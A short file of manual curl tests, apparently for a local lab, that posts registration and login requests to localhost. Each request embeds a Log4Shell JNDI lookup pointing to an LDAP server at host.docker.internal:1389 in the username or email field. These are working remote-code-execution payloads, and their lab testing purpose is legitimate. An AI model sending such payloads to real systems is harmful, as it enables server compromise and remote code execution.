# Manual tests with curl

# Test 1: Registration with existing username and JNDI payload in email
curl -X POST http://localhost:8080/register \
  -H "Content-Type: application/json" \
  -d '{"username":"admin","email":"${jndi:ldap://host.docker.internal:1389/Exploit}","password":"password123"}'

# Test 2: Invalid email with payload in username  
curl -X POST http://localhost:8080/register \
  -H "Content-Type: application/json" \
  -d '{"username":"${jndi:ldap://host.docker.internal:1389/Exploit}","email":"notanemail","password":"test123"}'

# Test 3: Password too short
curl -X POST http://localhost:8080/register \
  -H "Content-Type: application/json" \
  -d '{"username":"testuser","email":"${jndi:ldap://host.docker.internal:1389/Exploit}","password":"123"}'

# Test 4: Failed login with non-existent user
curl -X POST http://localhost:8080/login \
  -H "Content-Type: application/json" \
  -d '{"username":"${jndi:ldap://host.docker.internal:1389/Exploit}","password":"anything"}'
